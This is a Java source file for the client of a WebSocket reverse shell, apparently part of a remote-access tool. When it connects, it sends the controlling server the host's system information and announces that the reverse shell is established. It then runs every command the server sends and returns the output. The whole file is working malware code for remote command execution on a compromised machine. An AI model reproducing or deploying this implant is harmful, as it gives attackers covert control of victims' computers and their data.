package com.mtattab.reverseshell.service.impl;

import com.mtattab.reverseshell.model.CommandRestOutput;
import com.mtattab.reverseshell.model.ManagerCommunicationModel;
import com.mtattab.reverseshell.model.ServerRestCommunicationModel;
import com.mtattab.reverseshell.util.DataManipulationUtil;
import com.mtattab.reverseshell.util.OSUtil;
import com.mtattab.reverseshell.util.SystemCommandProxyUtil;
import lombok.Getter;
import lombok.Setter;
import lombok.extern.java.Log;
import org.eclipse.jetty.websocket.api.Session;
import org.eclipse.jetty.websocket.api.WebSocketAdapter;


import java.io.IOException;

@Getter
@Setter
@Log
public class WebSocketImpl extends WebSocketAdapter {

    private Session session;


    @Override
    public void onWebSocketText(String message) {
        log.info( message);
        ManagerCommunicationModel command = DataManipulationUtil.jsonToObject(message, ManagerCommunicationModel.class);
        executeCommandFromServer(command);

    }
    private void executeCommandFromServer(ManagerCommunicationModel command){
        if (command != null){
            CommandRestOutput commandRestOutput = SystemCommandProxyUtil.runCommand(command.getMsg());
            try {
                session.getRemote()
                        .sendString(
                                DataManipulationUtil.convertObjToJson(commandRestOutput)
                        );
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
    @Override
    public void onWebSocketConnect(Session session){
        this.session= session;
        sendInitialMessage();
    }

    private void sendInitialMessage(){
        try {
//            send initial message with computer info the command server
            ServerRestCommunicationModel initialCommunicationMessage=  OSUtil.getComputerInfo();
            initialCommunicationMessage.setReply("[+] ReverseShell has been established");

            session.getRemote()
                    .sendString(
                            DataManipulationUtil.convertObjToJson(initialCommunicationMessage)
                    );
        } catch (IOException e) {
            e.printStackTrace();
        }
    }







}
